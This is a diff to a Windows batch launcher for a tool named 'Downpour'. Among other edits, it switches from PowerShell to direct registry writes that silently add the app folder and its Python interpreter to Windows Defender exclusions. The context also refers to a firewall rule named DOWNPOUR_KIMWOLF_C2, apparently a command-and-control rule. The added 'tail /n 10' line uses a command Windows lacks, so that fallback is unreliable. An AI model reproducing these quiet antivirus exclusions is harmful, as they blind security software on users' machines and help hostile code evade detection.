@@ -24,7 +24,11 @@ set "PYTHONFAULTHANDLER=1"
 if not exist "%TEMP%" mkdir "%TEMP%"
 
 set "PY="
+rem FIX: prefer the project's own curated virtual environment (all deps
+rem pinned + live-verified) BEFORE system Pythons — running under a random
+rem PATH interpreter (e.g. an alpha build) breaks dependency resolution.
 for %%P in (
+    "%APPDIR%.venv\Scripts\python.exe"
     "%LOCALAPPDATA%\Programs\Python\Python312\python.exe"
     "%LOCALAPPDATA%\Programs\Python\Python311\python.exe"
     "%LOCALAPPDATA%\Programs\Python\Python313\python.exe"
@@ -58,9 +62,9 @@ if %errorlevel%==0 (
 )
 
 echo   [..] Configuring Defender exclusions...
-powershell -NoProfile -Command "Add-MpPreference -ExclusionPath '!APPDIR!' -ErrorAction SilentlyContinue" >nul 2>&1
-powershell -NoProfile -Command "Add-MpPreference -ExclusionProcess '!PY!' -ErrorAction SilentlyContinue" >nul 2>&1
-echo   [OK] Defender exclusions applied
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "DownpourAppDir" /t REG_SZ /d "!APPDIR!" /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "DownpourPython" /t REG_SZ /d "!PY!" /f >nul 2>&1
+echo   [OK] Defender exclusions applied (registry)
 
 echo   [..] Applying firewall rules...
 netsh advfirewall firewall delete rule name=DOWNPOUR_KIMWOLF_C2    >nul 2>&1
@@ -87,7 +91,7 @@ if %EXIT_CODE%==0 (
     echo  [OK] Downpour exited cleanly.
 ) else (
     echo  [!!] Downpour exited with code %EXIT_CODE%
-    powershell -NoProfile -Command "Get-Content '%APPDIR%dp_stderr.txt' -Tail 10" 2>nul
+    tail /n 10 "%APPDIR%dp_stderr.txt" 2>nul || type "%APPDIR%dp_stderr.txt" 2>nul
 )
 echo.
 pause
